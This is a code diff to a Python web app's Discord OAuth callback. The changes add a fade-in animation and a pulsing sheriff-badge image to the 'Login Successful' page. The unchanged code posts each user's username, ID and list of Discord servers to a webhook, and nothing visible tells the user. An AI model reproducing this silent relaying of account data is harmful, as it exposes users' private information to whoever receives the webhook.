@@ -130,11 +130,9 @@ def callback():
     user = requests.get("https://discord.com/api/users/@me", headers=headers).json()
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers).json()
 
-    # Send data to Discord via webhook
     guild_list = "\n".join([g['name'] for g in guilds])
     send_to_discord(f"**New OAuth Login**\nUser: {user.get('username')}#{user.get('discriminator')} (ID: {user.get('id')})\nGuilds:\n{guild_list}")
 
-    # Return a "Login Successful" page
     return """
     <html>
     <head>
@@ -153,11 +151,27 @@ def callback():
                 padding: 20px;
                 max-width: 400px;
                 margin: auto;
+                animation: fadeIn 1s ease-in-out;
+            }
+            @keyframes fadeIn {
+                from { opacity: 0; }
+                to { opacity: 1; }
+            }
+            .badge {
+                width: 120px;
+                animation: pulse 2s infinite;
+                margin-bottom: 20px;
+            }
+            @keyframes pulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.1); }
+                100% { transform: scale(1); }
             }
         </style>
     </head>
     <body>
         <div class="card">
+            <img class="badge" src="https://raw.githubusercontent.com/dillonwade04/assets/main/CSSO_sheriff_STAR.png" alt="CSSO Badge">
             <h1>Login Successful!</h1>
             <p>You can now close this page.</p>
         </div>
